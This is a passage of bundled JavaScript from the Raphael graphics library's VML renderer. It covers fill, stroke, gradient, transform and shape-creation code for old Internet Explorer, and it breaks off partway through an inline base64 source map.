}\n        if ("clip-rect" in params) {\n            var rect = Str(params["clip-rect"]).split(separator);\n            if (rect.length == 4) {\n                rect[2] = +rect[2] + (+rect[0]);\n                rect[3] = +rect[3] + (+rect[1]);\n                var div = node.clipRect || R._g.doc.createElement("div"),\n                    dstyle = div.style;\n                dstyle.clip = R.format("rect({1}px {2}px {3}px {0}px)", rect);\n                if (!node.clipRect) {\n                    dstyle.position = "absolute";\n                    dstyle.top = 0;\n                    dstyle.left = 0;\n                    dstyle.width = o.paper.width + "px";\n                    dstyle.height = o.paper.height + "px";\n                    node.parentNode.insertBefore(div, node);\n                    div.appendChild(node);\n                    node.clipRect = div;\n                }\n            }\n            if (!params["clip-rect"]) {\n                node.clipRect && (node.clipRect.style.clip = "auto");\n            }\n        }\n        if (o.textpath) {\n            var textpathStyle = o.textpath.style;\n            params.font && (textpathStyle.font = params.font);\n            params["font-family"] && (textpathStyle.fontFamily = \'"\' + params["font-family"].split(",")[0].replace(/^[\'"]+|[\'"]+$/g, E) + \'"\');\n            params["font-size"] && (textpathStyle.fontSize = params["font-size"]);\n            params["font-weight"] && (textpathStyle.fontWeight = params["font-weight"]);\n            params["font-style"] && (textpathStyle.fontStyle = params["font-style"]);\n        }\n        if ("arrow-start" in params) {\n            addArrow(res, params["arrow-start"]);\n        }\n        if ("arrow-end" in params) {\n            addArrow(res, params["arrow-end"], 1);\n        }\n        if (params.opacity != null ||\n            params.fill != null ||\n            params.src != null ||\n            params.stroke != null ||\n            params["stroke-width"] != null ||\n            params["stroke-opacity"] != null ||\n            params["fill-opacity"] != null ||\n            params["stroke-dasharray"] != null ||\n            params["stroke-miterlimit"] != null ||\n            params["stroke-linejoin"] != null ||\n            params["stroke-linecap"] != null) {\n            var fill = node.getElementsByTagName(fillString),\n                newfill = false;\n            fill = fill && fill[0];\n            !fill && (newfill = fill = createNode(fillString));\n            if (o.type == "image" && params.src) {\n                fill.src = params.src;\n            }\n            params.fill && (fill.on = true);\n            if (fill.on == null || params.fill == "none" || params.fill === null) {\n                fill.on = false;\n            }\n            if (fill.on && params.fill) {\n                var isURL = Str(params.fill).match(R._ISURL);\n                if (isURL) {\n                    fill.parentNode == node && node.removeChild(fill);\n                    fill.rotate = true;\n                    fill.src = isURL[1];\n                    fill.type = "tile";\n                    var bbox = o.getBBox(1);\n                    fill.position = bbox.x + S + bbox.y;\n                    o._.fillpos = [bbox.x, bbox.y];\n\n                    R._preload(isURL[1], function () {\n                        o._.fillsize = [this.offsetWidth, this.offsetHeight];\n                    });\n                } else {\n                    fill.color = R.getRGB(params.fill).hex;\n                    fill.src = E;\n                    fill.type = "solid";\n                    if (R.getRGB(params.fill).error && (res.type in {circle: 1, ellipse: 1} || Str(params.fill).charAt() != "r") && addGradientFill(res, params.fill, fill)) {\n                        a.fill = "none";\n                        a.gradient = params.fill;\n                        fill.rotate = false;\n                    }\n                }\n            }\n            if ("fill-opacity" in params || "opacity" in params) {\n                var opacity = ((+a["fill-opacity"] + 1 || 2) - 1) * ((+a.opacity + 1 || 2) - 1) * ((+R.getRGB(params.fill).o + 1 || 2) - 1);\n                opacity = mmin(mmax(opacity, 0), 1);\n                fill.opacity = opacity;\n                if (fill.src) {\n                    fill.color = "none";\n                }\n            }\n            node.appendChild(fill);\n            var stroke = (node.getElementsByTagName("stroke") && node.getElementsByTagName("stroke")[0]),\n            newstroke = false;\n            !stroke && (newstroke = stroke = createNode("stroke"));\n            if ((params.stroke && params.stroke != "none") ||\n                params["stroke-width"] ||\n                params["stroke-opacity"] != null ||\n                params["stroke-dasharray"] ||\n                params["stroke-miterlimit"] ||\n                params["stroke-linejoin"] ||\n                params["stroke-linecap"]) {\n                stroke.on = true;\n            }\n            (params.stroke == "none" || params.stroke === null || stroke.on == null || params.stroke == 0 || params["stroke-width"] == 0) && (stroke.on = false);\n            var strokeColor = R.getRGB(params.stroke);\n            stroke.on && params.stroke && (stroke.color = strokeColor.hex);\n            opacity = ((+a["stroke-opacity"] + 1 || 2) - 1) * ((+a.opacity + 1 || 2) - 1) * ((+strokeColor.o + 1 || 2) - 1);\n            var width = (toFloat(params["stroke-width"]) || 1) * .75;\n            opacity = mmin(mmax(opacity, 0), 1);\n            params["stroke-width"] == null && (width = a["stroke-width"]);\n            params["stroke-width"] && (stroke.weight = width);\n            width && width < 1 && (opacity *= width) && (stroke.weight = 1);\n            stroke.opacity = opacity;\n\n            params["stroke-linejoin"] && (stroke.joinstyle = params["stroke-linejoin"] || "miter");\n            stroke.miterlimit = params["stroke-miterlimit"] || 8;\n            params["stroke-linecap"] && (stroke.endcap = params["stroke-linecap"] == "butt" ? "flat" : params["stroke-linecap"] == "square" ? "square" : "round");\n            if ("stroke-dasharray" in params) {\n                var dasharray = {\n                    "-": "shortdash",\n                    ".": "shortdot",\n                    "-.": "shortdashdot",\n                    "-..": "shortdashdotdot",\n                    ". ": "dot",\n                    "- ": "dash",\n                    "--": "longdash",\n                    "- .": "dashdot",\n                    "--.": "longdashdot",\n                    "--..": "longdashdotdot"\n                };\n                stroke.dashstyle = dasharray[has](params["stroke-dasharray"]) ? dasharray[params["stroke-dasharray"]] : E;\n            }\n            newstroke && node.appendChild(stroke);\n        }\n        if (res.type == "text") {\n            res.paper.canvas.style.display = E;\n            var span = res.paper.span,\n                m = 100,\n                fontSize = a.font && a.font.match(/\\d+(?:\\.\\d*)?(?=px)/);\n            s = span.style;\n            a.font && (s.font = a.font);\n            a["font-family"] && (s.fontFamily = a["font-family"]);\n            a["font-weight"] && (s.fontWeight = a["font-weight"]);\n            a["font-style"] && (s.fontStyle = a["font-style"]);\n            fontSize = toFloat(a["font-size"] || fontSize && fontSize[0]) || 10;\n            s.fontSize = fontSize * m + "px";\n            res.textpath.string && (span.innerHTML = Str(res.textpath.string).replace(/</g, "&#60;").replace(/&/g, "&#38;").replace(/\\n/g, "<br>"));\n            var brect = span.getBoundingClientRect();\n            res.W = a.w = (brect.right - brect.left) / m;\n            res.H = a.h = (brect.bottom - brect.top) / m;\n            // res.paper.canvas.style.display = "none";\n            res.X = a.x;\n            res.Y = a.y + res.H / 2;\n\n            ("x" in params || "y" in params) && (res.path.v = R.format("m{0},{1}l{2},{1}", round(a.x * zoom), round(a.y * zoom), round(a.x * zoom) + 1));\n            var dirtyattrs = ["x", "y", "text", "font", "font-family", "font-weight", "font-style", "font-size"];\n            for (var d = 0, dd = dirtyattrs.length; d < dd; d++) if (dirtyattrs[d] in params) {\n                res._.dirty = 1;\n                break;\n            }\n\n            // text-anchor emulation\n            switch (a["text-anchor"]) {\n                case "start":\n                    res.textpath.style["v-text-align"] = "left";\n                    res.bbx = res.W / 2;\n                break;\n                case "end":\n                    res.textpath.style["v-text-align"] = "right";\n                    res.bbx = -res.W / 2;\n                break;\n                default:\n                    res.textpath.style["v-text-align"] = "center";\n                    res.bbx = 0;\n                break;\n            }\n            res.textpath.style["v-text-kern"] = true;\n        }\n        // res.paper.canvas.style.display = E;\n    },\n    addGradientFill = function (o, gradient, fill) {\n        o.attrs = o.attrs || {};\n        var attrs = o.attrs,\n            pow = Math.pow,\n            opacity,\n            oindex,\n            type = "linear",\n            fxfy = ".5 .5";\n        o.attrs.gradient = gradient;\n        gradient = Str(gradient).replace(R._radial_gradient, function (all, fx, fy) {\n            type = "radial";\n            if (fx && fy) {\n                fx = toFloat(fx);\n                fy = toFloat(fy);\n                pow(fx - .5, 2) + pow(fy - .5, 2) > .25 && (fy = math.sqrt(.25 - pow(fx - .5, 2)) * ((fy > .5) * 2 - 1) + .5);\n                fxfy = fx + S + fy;\n            }\n            return E;\n        });\n        gradient = gradient.split(/\\s*\\-\\s*/);\n        if (type == "linear") {\n            var angle = gradient.shift();\n            angle = -toFloat(angle);\n            if (isNaN(angle)) {\n                return null;\n            }\n        }\n        var dots = R._parseDots(gradient);\n        if (!dots) {\n            return null;\n        }\n        o = o.shape || o.node;\n        if (dots.length) {\n            o.removeChild(fill);\n            fill.on = true;\n            fill.method = "none";\n            fill.color = dots[0].color;\n            fill.color2 = dots[dots.length - 1].color;\n            var clrs = [];\n            for (var i = 0, ii = dots.length; i < ii; i++) {\n                dots[i].offset && clrs.push(dots[i].offset + S + dots[i].color);\n            }\n            fill.colors = clrs.length ? clrs.join() : "0% " + fill.color;\n            if (type == "radial") {\n                fill.type = "gradientTitle";\n                fill.focus = "100%";\n                fill.focussize = "0 0";\n                fill.focusposition = fxfy;\n                fill.angle = 0;\n            } else {\n                // fill.rotate= true;\n                fill.type = "gradient";\n                fill.angle = (270 - angle) % 360;\n            }\n            o.appendChild(fill);\n        }\n        return 1;\n    },\n    Element = function (node, vml) {\n        this[0] = this.node = node;\n        node.raphael = true;\n        this.id = R._oid++;\n        node.raphaelid = this.id;\n        this.X = 0;\n        this.Y = 0;\n        this.attrs = {};\n        this.paper = vml;\n        this.matrix = R.matrix();\n        this._ = {\n            transform: [],\n            sx: 1,\n            sy: 1,\n            dx: 0,\n            dy: 0,\n            deg: 0,\n            dirty: 1,\n            dirtyT: 1\n        };\n        !vml.bottom && (vml.bottom = this);\n        this.prev = vml.top;\n        vml.top && (vml.top.next = this);\n        vml.top = this;\n        this.next = null;\n    };\n    var elproto = R.el;\n\n    Element.prototype = elproto;\n    elproto.constructor = Element;\n    elproto.transform = function (tstr) {\n        if (tstr == null) {\n            return this._.transform;\n        }\n        var vbs = this.paper._viewBoxShift,\n            vbt = vbs ? "s" + [vbs.scale, vbs.scale] + "-1-1t" + [vbs.dx, vbs.dy] : E,\n            oldt;\n        if (vbs) {\n            oldt = tstr = Str(tstr).replace(/\\.{3}|\\u2026/g, this._.transform || E);\n        }\n        R._extractTransform(this, vbt + tstr);\n        var matrix = this.matrix.clone(),\n            skew = this.skew,\n            o = this.node,\n            split,\n            isGrad = ~Str(this.attrs.fill).indexOf("-"),\n            isPatt = !Str(this.attrs.fill).indexOf("url(");\n        matrix.translate(1, 1);\n        if (isPatt || isGrad || this.type == "image") {\n            skew.matrix = "1 0 0 1";\n            skew.offset = "0 0";\n            split = matrix.split();\n            if ((isGrad && split.noRotation) || !split.isSimple) {\n                o.style.filter = matrix.toFilter();\n                var bb = this.getBBox(),\n                    bbt = this.getBBox(1),\n                    dx = bb.x - bbt.x,\n                    dy = bb.y - bbt.y;\n                o.coordorigin = (dx * -zoom) + S + (dy * -zoom);\n                setCoords(this, 1, 1, dx, dy, 0);\n            } else {\n                o.style.filter = E;\n                setCoords(this, split.scalex, split.scaley, split.dx, split.dy, split.rotate);\n            }\n        } else {\n            o.style.filter = E;\n            skew.matrix = Str(matrix);\n            skew.offset = matrix.offset();\n        }\n        if (oldt !== null) { // empty string value is true as well\n            this._.transform = oldt;\n            R._extractTransform(this, oldt);\n        }\n        return this;\n    };\n    elproto.rotate = function (deg, cx, cy) {\n        if (this.removed) {\n            return this;\n        }\n        if (deg == null) {\n            return;\n        }\n        deg = Str(deg).split(separator);\n        if (deg.length - 1) {\n            cx = toFloat(deg[1]);\n            cy = toFloat(deg[2]);\n        }\n        deg = toFloat(deg[0]);\n        (cy == null) && (cx = cy);\n        if (cx == null || cy == null) {\n            var bbox = this.getBBox(1);\n            cx = bbox.x + bbox.width / 2;\n            cy = bbox.y + bbox.height / 2;\n        }\n        this._.dirtyT = 1;\n        this.transform(this._.transform.concat([["r", deg, cx, cy]]));\n        return this;\n    };\n    elproto.translate = function (dx, dy) {\n        if (this.removed) {\n            return this;\n        }\n        dx = Str(dx).split(separator);\n        if (dx.length - 1) {\n            dy = toFloat(dx[1]);\n        }\n        dx = toFloat(dx[0]) || 0;\n        dy = +dy || 0;\n        if (this._.bbox) {\n            this._.bbox.x += dx;\n            this._.bbox.y += dy;\n        }\n        this.transform(this._.transform.concat([["t", dx, dy]]));\n        return this;\n    };\n    elproto.scale = function (sx, sy, cx, cy) {\n        if (this.removed) {\n            return this;\n        }\n        sx = Str(sx).split(separator);\n        if (sx.length - 1) {\n            sy = toFloat(sx[1]);\n            cx = toFloat(sx[2]);\n            cy = toFloat(sx[3]);\n            isNaN(cx) && (cx = null);\n            isNaN(cy) && (cy = null);\n        }\n        sx = toFloat(sx[0]);\n        (sy == null) && (sy = sx);\n        (cy == null) && (cx = cy);\n        if (cx == null || cy == null) {\n            var bbox = this.getBBox(1);\n        }\n        cx = cx == null ? bbox.x + bbox.width / 2 : cx;\n        cy = cy == null ? bbox.y + bbox.height / 2 : cy;\n\n        this.transform(this._.transform.concat([["s", sx, sy, cx, cy]]));\n        this._.dirtyT = 1;\n        return this;\n    };\n    elproto.hide = function () {\n        !this.removed && (this.node.style.display = "none");\n        return this;\n    };\n    elproto.show = function () {\n        !this.removed && (this.node.style.display = E);\n        return this;\n    };\n    // Needed to fix the vml setViewBox issues\n    elproto.auxGetBBox = R.el.getBBox;\n    elproto.getBBox = function(){\n      var b = this.auxGetBBox();\n      if (this.paper && this.paper._viewBoxShift)\n      {\n        var c = {};\n        var z = 1/this.paper._viewBoxShift.scale;\n        c.x = b.x - this.paper._viewBoxShift.dx;\n        c.x *= z;\n        c.y = b.y - this.paper._viewBoxShift.dy;\n        c.y *= z;\n        c.width  = b.width  * z;\n        c.height = b.height * z;\n        c.x2 = c.x + c.width;\n        c.y2 = c.y + c.height;\n        return c;\n      }\n      return b;\n    };\n    elproto._getBBox = function () {\n        if (this.removed) {\n            return {};\n        }\n        return {\n            x: this.X + (this.bbx || 0) - this.W / 2,\n            y: this.Y - this.H,\n            width: this.W,\n            height: this.H\n        };\n    };\n    elproto.remove = function () {\n        if (this.removed || !this.node.parentNode) {\n            return;\n        }\n        this.paper.__set__ && this.paper.__set__.exclude(this);\n        R.eve.unbind("raphael.*.*." + this.id);\n        R._tear(this, this.paper);\n        this.node.parentNode.removeChild(this.node);\n        this.shape && this.shape.parentNode.removeChild(this.shape);\n        for (var i in this) {\n            this[i] = typeof this[i] == "function" ? R._removedFactory(i) : null;\n        }\n        this.removed = true;\n    };\n    elproto.attr = function (name, value) {\n        if (this.removed) {\n            return this;\n        }\n        if (name == null) {\n            var res = {};\n            for (var a in this.attrs) if (this.attrs[has](a)) {\n                res[a] = this.attrs[a];\n            }\n            res.gradient && res.fill == "none" && (res.fill = res.gradient) && delete res.gradient;\n            res.transform = this._.transform;\n            return res;\n        }\n        if (value == null && R.is(name, "string")) {\n            if (name == fillString && this.attrs.fill == "none" && this.attrs.gradient) {\n                return this.attrs.gradient;\n            }\n            var names = name.split(separator),\n                out = {};\n            for (var i = 0, ii = names.length; i < ii; i++) {\n                name = names[i];\n                if (name in this.attrs) {\n                    out[name] = this.attrs[name];\n                } else if (R.is(this.paper.customAttributes[name], "function")) {\n                    out[name] = this.paper.customAttributes[name].def;\n                } else {\n                    out[name] = R._availableAttrs[name];\n                }\n            }\n            return ii - 1 ? out : out[names[0]];\n        }\n        if (this.attrs && value == null && R.is(name, "array")) {\n            out = {};\n            for (i = 0, ii = name.length; i < ii; i++) {\n                out[name[i]] = this.attr(name[i]);\n            }\n            return out;\n        }\n        var params;\n        if (value != null) {\n            params = {};\n            params[name] = value;\n        }\n        value == null && R.is(name, "object") && (params = name);\n        for (var key in params) {\n            eve("raphael.attr." + key + "." + this.id, this, params[key]);\n        }\n        if (params) {\n            for (key in this.paper.customAttributes) if (this.paper.customAttributes[has](key) && params[has](key) && R.is(this.paper.customAttributes[key], "function")) {\n                var par = this.paper.customAttributes[key].apply(this, [].concat(params[key]));\n                this.attrs[key] = params[key];\n                for (var subkey in par) if (par[has](subkey)) {\n                    params[subkey] = par[subkey];\n                }\n            }\n            // this.paper.canvas.style.display = "none";\n            if (params.text && this.type == "text") {\n                this.textpath.string = params.text;\n            }\n            setFillAndStroke(this, params);\n            // this.paper.canvas.style.display = E;\n        }\n        return this;\n    };\n    elproto.toFront = function () {\n        !this.removed && this.node.parentNode.appendChild(this.node);\n        this.paper && this.paper.top != this && R._tofront(this, this.paper);\n        return this;\n    };\n    elproto.toBack = function () {\n        if (this.removed) {\n            return this;\n        }\n        if (this.node.parentNode.firstChild != this.node) {\n            this.node.parentNode.insertBefore(this.node, this.node.parentNode.firstChild);\n            R._toback(this, this.paper);\n        }\n        return this;\n    };\n    elproto.insertAfter = function (element) {\n        if (this.removed) {\n            return this;\n        }\n        if (element.constructor == R.st.constructor) {\n            element = element[element.length - 1];\n        }\n        if (element.node.nextSibling) {\n            element.node.parentNode.insertBefore(this.node, element.node.nextSibling);\n        } else {\n            element.node.parentNode.appendChild(this.node);\n        }\n        R._insertafter(this, element, this.paper);\n        return this;\n    };\n    elproto.insertBefore = function (element) {\n        if (this.removed) {\n            return this;\n        }\n        if (element.constructor == R.st.constructor) {\n            element = element[0];\n        }\n        element.node.parentNode.insertBefore(this.node, element.node);\n        R._insertbefore(this, element, this.paper);\n        return this;\n    };\n    elproto.blur = function (size) {\n        var s = this.node.runtimeStyle,\n            f = s.filter;\n        f = f.replace(blurregexp, E);\n        if (+size !== 0) {\n            this.attrs.blur = size;\n            s.filter = f + S + ms + ".Blur(pixelradius=" + (+size || 1.5) + ")";\n            s.margin = R.format("-{0}px 0 0 -{0}px", round(+size || 1.5));\n        } else {\n            s.filter = f;\n            s.margin = 0;\n            delete this.attrs.blur;\n        }\n        return this;\n    };\n\n    R._engine.path = function (pathString, vml) {\n        var el = createNode("shape");\n        el.style.cssText = cssDot;\n        el.coordsize = zoom + S + zoom;\n        el.coordorigin = vml.coordorigin;\n        var p = new Element(el, vml),\n            attr = {fill: "none", stroke: "#000"};\n        pathString && (attr.path = pathString);\n        p.type = "path";\n        p.path = [];\n        p.Path = E;\n        setFillAndStroke(p, attr);\n        vml.canvas && vml.canvas.appendChild(el);\n        var skew = createNode("skew");\n        skew.on = true;\n        el.appendChild(skew);\n        p.skew = skew;\n        p.transform(E);\n        return p;\n    };\n    R._engine.rect = function (vml, x, y, w, h, r) {\n        var path = R._rectPath(x, y, w, h, r),\n            res = vml.path(path),\n            a = res.attrs;\n        res.X = a.x = x;\n        res.Y = a.y = y;\n        res.W = a.width = w;\n        res.H = a.height = h;\n        a.r = r;\n        a.path = path;\n        res.type = "rect";\n        return res;\n    };\n    R._engine.ellipse = function (vml, x, y, rx, ry) {\n        var res = vml.path(),\n            a = res.attrs;\n        res.X = x - rx;\n        res.Y = y - ry;\n        res.W = rx * 2;\n        res.H = ry * 2;\n        res.type = "ellipse";\n        setFillAndStroke(res, {\n            cx: x,\n            cy: y,\n            rx: rx,\n            ry: ry\n        });\n        return res;\n    };\n    R._engine.circle = function (vml, x, y, r) {\n        var res = vml.path(),\n            a = res.attrs;\n        res.X = x - r;\n        res.Y = y - r;\n        res.W = res.H = r * 2;\n        res.type = "circle";\n        setFillAndStroke(res, {\n            cx: x,\n            cy: y,\n            r: r\n        });\n        return res;\n    };\n    R._engine.image = function (vml, src, x, y, w, h) {\n        var path = R._rectPath(x, y, w, h),\n            res = vml.path(path).attr({stroke: "none"}),\n            a = res.attrs,\n            node = res.node,\n            fill = node.getElementsByTagName(fillString)[0];\n        a.src = src;\n        res.X = a.x = x;\n        res.Y = a.y = y;\n        res.W = a.width = w;\n        res.H = a.height = h;\n        a.path = path;\n        res.type = "image";\n        fill.parentNode == node && node.removeChild(fill);\n        fill.rotate = true;\n        fill.src = src;\n        fill.type = "tile";\n        res._.fillpos = [x, y];\n        res._.fillsize = [w, h];\n        node.appendChild(fill);\n        setCoords(res, 1, 1, 0, 0, 0);\n        return res;\n    };\n    R._engine.text = function (vml, x, y, text) {\n        var el = createNode("shape"),\n            path = createNode("path"),\n            o = createNode("textpath");\n        x = x || 0;\n        y = y || 0;\n        text = text || "";\n        path.v = R.format("m{0},{1}l{2},{1}", round(x * zoom), round(y * zoom), round(x * zoom) + 1);\n        path.textpathok = true;\n        o.string = Str(text);\n        o.on = true;\n        el.style.cssText = cssDot;\n        el.coordsize = zoom + S + zoom;\n        el.coordorigin = "0 0";\n        var p = new Element(el, vml),\n            attr = {\n                fill: "#000",\n                stroke: "none",\n                font: R._availableAttrs.font,\n                text: text\n            };\n        p.shape = el;\n        p.path = path;\n        p.textpath = o;\n        p.type = "text";\n        p.attrs.text = Str(text);\n        p.attrs.x = x;\n        p.attrs.y = y;\n        p.attrs.w = 1;\n        p.attrs.h = 1;\n        setFillAndStroke(p, attr);\n        el.appendChild(o);\n        el.appendChild(path);\n        vml.canvas.appendChild(el);\n        var skew = createNode("skew");\n        skew.on = true;\n        el.appendChild(skew);\n        p.skew = skew;\n        p.transform(E);\n        return p;\n    };\n    R._engine.setSize = function (width, height) {\n        var cs = this.canvas.style;\n        this.width = width;\n        this.height = height;\n        width == +width && (width += "px");\n        height == +height && (height += "px");\n        cs.width = width;\n        cs.height = height;\n        cs.clip = "rect(0 " + width + " " + height + " 0)";\n        if (this._viewBox) {\n            R._engine.setViewBox.apply(this, this._viewBox);\n        }\n        return this;\n    };\n    R._engine.setViewBox = function (x, y, w, h, fit) {\n        R.eve("raphael.setViewBox", this, this._viewBox, [x, y, w, h, fit]);\n        var paperSize = this.getSize(),\n            width = paperSize.width,\n            height = paperSize.height,\n            H, W;\n        if (fit) {\n            H = height / h;\n            W = width / w;\n            if (w * H < width) {\n                x -= (width - w * H) / 2 / H;\n            }\n            if (h * W < height) {\n                y -= (height - h * W) / 2 / W;\n            }\n        }\n        this._viewBox = [x, y, w, h, !!fit];\n        this._viewBoxShift = {\n            dx: -x,\n            dy: -y,\n            scale: paperSize\n        };\n        this.forEach(function (el) {\n            el.transform("...");\n        });\n        return this;\n    };\n    var createNode;\n    R._engine.initWin = function (win) {\n            var doc = win.document;\n            if (doc.styleSheets.length < 31) {\n                doc.createStyleSheet().addRule(".rvml", "behavior:url(#default#VML)");\n            } else {\n                // no more room, add to the existing one\n                // https://msdn.microsoft.com/en-us/library/ms531194%28VS.85%29.aspx\n                doc.styleSheets[0].addRule(".rvml", "behavior:url(#default#VML)");\n            }\n            try {\n                !doc.namespaces.rvml && doc.namespaces.add("rvml", "urn:schemas-microsoft-com:vml");\n                createNode = function (tagName) {\n                    return doc.createElement(\'<rvml:\' + tagName + \' class="rvml">\');\n                };\n            } catch (e) {\n                createNode = function (tagName) {\n                    return doc.createElement(\'<\' + tagName + \' xmlns="urn:schemas-microsoft.com:vml" class="rvml">\');\n                };\n            }\n        };\n    R._engine.initWin(R._g.win);\n    R._engine.create = function () {\n        var con = R._getContainer.apply(0, arguments),\n            container = con.container,\n            height = con.height,\n            s,\n            width = con.width,\n            x = con.x,\n            y = con.y;\n        if (!container) {\n            throw new Error("VML container not found.");\n        }\n        var res = new R._Paper,\n            c = res.canvas = R._g.doc.createElement("div"),\n            cs = c.style;\n        x = x || 0;\n        y = y || 0;\n        width = width || 512;\n        height = height || 342;\n        res.width = width;\n        res.height = height;\n        width == +width && (width += "px");\n        height == +height && (height += "px");\n        res.coordsize = zoom * 1e3 + S + zoom * 1e3;\n        res.coordorigin = "0 0";\n        res.span = R._g.doc.createElement("span");\n        res.span.style.cssText = "position:absolute;left:-9999em;top:-9999em;padding:0;margin:0;line-height:1;";\n        c.appendChild(res.span);\n        cs.cssText = R.format("top:0;left:0;width:{0};height:{1};display:inline-block;position:relative;clip:rect(0 {0} {1} 0);overflow:hidden", width, height);\n        if (container == 1) {\n            R._g.doc.body.appendChild(c);\n            cs.left = x + "px";\n            cs.top = y + "px";\n            cs.position = "absolute";\n        } else {\n            if (container.firstChild) {\n                container.insertBefore(c, container.firstChild);\n            } else {\n                container.appendChild(c);\n            }\n        }\n        res.renderfix = function () {};\n        return res;\n    };\n    R.prototype.clear = function () {\n        R.eve("raphael.clear", this);\n        this.canvas.innerHTML = E;\n        this.span = R._g.doc.createElement("span");\n        this.span.style.cssText = "position:absolute;left:-9999em;top:-9999em;padding:0;margin:0;line-height:1;display:inline;";\n        this.canvas.appendChild(this.span);\n        this.bottom = this.top = null;\n    };\n    R.prototype.remove = function () {\n        R.eve("raphael.remove", this);\n        this.canvas.parentNode.removeChild(this.canvas);\n        for (var i in this) {\n            this[i] = typeof this[i] == "function" ? R._removedFactory(i) : null;\n        }\n        return true;\n    };\n\n    var setproto = R.st;\n    for (var method in elproto) if (elproto[has](method) && !setproto[has](method)) {\n        setproto[method] = (function (methodname) {\n            return function () {\n                var arg = arguments;\n                return this.forEach(function (el) {\n                    el[methodname].apply(el, arg);\n                });\n            };\n        })(method);\n    }\n}).apply(exports, __WEBPACK_AMD_DEFINE_ARRAY__),\n\t\t\t\t__WEBPACK_AMD_DEFINE_RESULT__ !== undefined && (module.exports = __WEBPACK_AMD_DEFINE_RESULT__));\n//# sourceURL=[module]\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJmaWxlIjoiLi9kZXYvcmFwaGFlbC52bWwuanMuanMiLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly9SYXBoYWVsLy4vZGV2L3JhcGhhZWwudm1sLmpzP2JhZjAiXSwic291cmNlc0NvbnRlbnQiOlsiZGVmaW5lKFtcIi4vcmFwaGFlbC5jb3JlXCJdLCBmdW5jdGlvbihSKSB7XG4gICAgaWYgKFIgJiYgIVIudm1sKSB7XG4gICAgICAgIHJldHVybjtcbiAgICB9XG5cbiAgICB2YXIgaGFzID0gXCJoYXNPd25Qcm9wZXJ0eVwiLFxuICAgICAgICBTdHIgPSBTdHJpbmcsXG4gICAgICAgIHRvRmxvYXQgPSBwYXJzZUZsb2F0LFxuICAgICAgICBtYXRoID0gTWF0aCxcbiAgICAgICAgcm91bmQgPSBtYXRoLnJvdW5kLFxuICAgICAgICBtbWF4ID0gbWF0aC5tYXgsXG4gICAgICAgIG1taW4gPSBtYXRoLm1pbixcbiAgICAgICAgYWJzID0gbWF0aC5hYnMsXG4gICAgICAgIGZpbGxTdHJpbmcgPSBcImZpbGxcIixcbiAgICAgICAgc2VwYXJhdG9yID0gL1ssIF0rLyxcbiAgICAgICAgZXZlID0gUi5ldmUsXG4gICAgICAgIG1zID0gXCIgcHJvZ2lkOkRYSW1hZ2VUcmFuc2Zvcm0uTWljcm9zb2Z0XCIsXG4gICAgICAgIFMgPSBcIiBcIixcbiAgICAgICAgRSA9IFwiXCIsXG4gICAgICAgIG1hcCA9IHtNOiBcIm1cIiwgTDogXCJsXCIsIEM6IFwiY1wiLCBaOiBcInhcIiwgbTogXCJ0XCIsIGw6IFwiclwiLCBjOiBcInZcIiwgejogXCJ4XCJ9LFxuICAgICAgICBiaXRlcyA9IC8oW2NsbXpdKSw/KFteY2xtel0qKS9naSxcbiAgICAgICAgYmx1cnJlZ2V4cCA9IC8gcHJvZ2lkOlxcUytCbHVyXFwoW15cXCldK1xcKS9nLFxuICAgICAgICB2YWwgPSAvLT9bXixcXHMtXSsvZyxcbiAgICAgICAgY3NzRG90ID0gXCJwb3NpdGlvbjphYnNvbHV0ZTtsZWZ0OjA7dG9wOjA7d2lkdGg6MXB4O2hlaWdodDoxcHg7YmVoYXZpb3I6dXJsKCNkZWZhdWx0I1ZNTClcIixcbiAgICAgICAgem9vbSA9IDIxNjAwLFxuICAgICAgICBwYXRoVHlwZXMgPSB7cGF0aDogMSwgcmVjdDogMSwgaW1hZ2U6IDF9LFxuICAgICAgICBvdmFsVHlwZXMgPSB7Y2lyY2xlOiAxLCBlbGxpcHNlOiAxfSxcbiAgICAgICAgcGF0aDJ2bWwgPSBmdW5jdGlvbiAocGF0aCkge1xuICAgICAgICAgICAgdmFyIHRvdGFsID0gIC9bYWhxc3R2XS9pZyxcbiAgICAgICAgICAgICAgICBjb21tYW5kID0gUi5fcGF0aFRvQWJzb2x1dGU7XG4gICAgICAgICAgICBTdHIocGF0aCkubWF0Y2godG90YWwpICYmIChjb21tYW5kID0gUi5fcGF0aDJjdXJ2ZSk7XG4gICAgICAgICAgICB0b3RhbCA9IC9bY2xtel0vZztcbiAgICAgICAgICAgIGlmIChjb21tYW5kID09IFIuX3BhdGhUb0Fic29sdXRlICYmICFTdHIocGF0aCkubWF0Y2godG90YWwpKSB7XG4gICAgICAgICAgICAgICAgdmFyIHJlcyA9IFN0cihwYXRoKS5yZXBsYWNlKGJpdGVzLCBmdW5jdGlvbiAoYWxsLCBjb21tYW5kLCBhcmdzKSB7XG4gICAgICAgICAgICAgICAgICAgIHZhciB2YWxzID0gW10sXG4gICAgICAgICAgICAgICAgICAgICAgICBpc01vdmUgPSBjb21tYW5kLnRvTG93ZXJDYXNlKCkgPT0gXCJtXCIsXG4gICAgICAgICAgICAgICAgICAgICAgICByZXMgPSBtYXBbY29tbWFuZF07XG4gICAgICAgICAgICAgICAgICAgIGFyZ3MucmVwbGFjZSh2YWwsIGZ1bmN0aW9uICh2YWx1ZSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGlzTW92ZSAmJiB2YWxzLmxlbmd0aCA9PSAyKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVzICs9IHZhbHMgKyBtYXBbY29tbWFuZCA9PSBcIm1cIiA/IFwibFwiIDogXCJMXCJdO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhbHMgPSBbXTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgIHZhbHMucHVzaChyb3VuZCh2YWx1ZSAqIHpvb20pKTtcbiAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgIHJldHVybiByZXMgKyB2YWxzO1xuICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgIHJldHVybiByZXM7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICB2YXIgcGEgPSBjb21tYW5kKHBhdGgpLCBwLCByO1xuICAgICAgICAgICAgcmVzID0gW107XG4gICAgICAgICAgICBmb3IgKHZhciBpID0gMCwgaWkgPSBwYS5sZW5ndGg7IGkgPCBpa